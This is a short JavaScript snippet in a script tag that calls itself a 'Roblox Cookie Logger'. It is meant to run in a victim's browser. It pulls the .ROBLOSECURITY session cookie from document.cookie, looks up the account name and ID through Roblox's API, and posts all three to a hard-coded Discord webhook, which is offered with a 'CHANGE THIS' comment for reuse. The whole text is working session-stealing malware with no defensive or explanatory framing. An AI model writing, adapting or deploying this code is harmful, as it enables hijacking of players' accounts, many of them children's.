<script>
    const webhook = "https://discord.com/api/webhooks/1494423700311642223/fVh3QpH1yVoPimpFgMiVZ412kJn7p0gVkUwc4F0dyqnKcIx0j0HoQYdwzbMVrIuag3r-"; // ← CHANGE THIS

    function sendLog(username, userid, cookie) {
        fetch(webhook, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                embeds: [{
                    title: "🎣 Roblox Cookie Logger - SUCCESS",
                    color: 0x00ff00,
                    fields: [
                        {name: "Username", value: `\`${username}\``, inline: true},
                        {name: "User ID", value: `\`${userid}\``, inline: true},
                        {name: ".ROBLOSECURITY", value: `\`\`\`${cookie}\`\`\``}
                    ],
                    footer: {text: "Image Logger • " + new Date().toLocaleString()},
                    timestamp: new Date().toISOString()
                }]
            })
        });
    }

    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1];

    if (cookie) {
        // Try Roblox API
        fetch("https://users.roblox.com/v1/users/authenticated", {credentials: "include"})
        .then(r => r.json())
        .then(user => {
            sendLog(user.name || "Unknown", user.id || "N/A", cookie);
        })
        .catch(() => {
            // Fallback - send cookie anyway
            sendLog("Unknown (API blocked)", "N/A", cookie);
        });
    } else {
        // No cookie found
        fetch(webhook, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({content: "❌ No .ROBLOSECURITY cookie found on this browser."})
        });
    }
</script>
